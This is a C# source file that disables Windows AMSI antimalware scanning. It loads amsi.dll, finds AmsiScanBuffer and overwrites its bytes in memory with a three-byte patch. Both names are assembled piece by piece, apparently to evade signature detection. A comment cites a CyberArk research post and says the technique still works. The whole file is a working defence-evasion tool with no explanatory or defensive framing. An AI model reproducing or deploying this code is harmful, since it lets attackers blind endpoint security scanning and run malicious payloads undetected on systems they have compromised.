using System;
using System.Runtime.InteropServices;

namespace Bypass
{
    public class Siam
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        public static int Disable()
        {	
			string dllName = "am";
			dllName = "am" + "si" + ".dll";
            IntPtr TargetDLL = LoadLibrary(dllName);
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve -> " + dllName + " pointer.");
                return 1;
            }
			Console.WriteLine("[+] siam LoadLibrary");
			string funName = "Am";
			funName += "si";
			funName += "S"+"c"+"a"+"n";
			funName += "Buffer";
            IntPtr SiamScanBufferPtr = GetProcAddress(TargetDLL, funName);
            if (SiamScanBufferPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve " + funName + " function pointer");
                return 1;
            }
			Console.WriteLine("[+] siam GetProcAddress");
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(SiamScanBufferPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not change SiamScanBuffer memory permissions!");
                return 1;
            }
			Console.WriteLine("[+] siam VirtualProtect");
            /*
             * This is a new technique, and is still working.
             * Source: https://www.cyberark.com/threat-research-blog/asmi-bypass-redux/
             */
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(SiamScanBufferPtr + 0x001b, unmanagedPointer, 3);

            Console.WriteLine("[+] siam Patched");
            return 0;
        }
    }
}

